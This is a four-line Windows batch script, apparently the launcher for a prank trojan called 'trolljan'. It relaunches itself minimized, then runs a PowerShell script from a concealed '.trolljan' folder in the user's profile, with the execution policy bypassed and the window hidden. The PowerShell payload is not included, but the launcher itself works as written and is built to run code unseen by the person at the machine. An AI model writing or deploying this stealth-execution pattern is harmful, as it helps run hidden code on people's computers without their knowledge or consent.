@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -File "C:\Users\%USERNAME%\.trolljan\trolljan.ps1"
exit
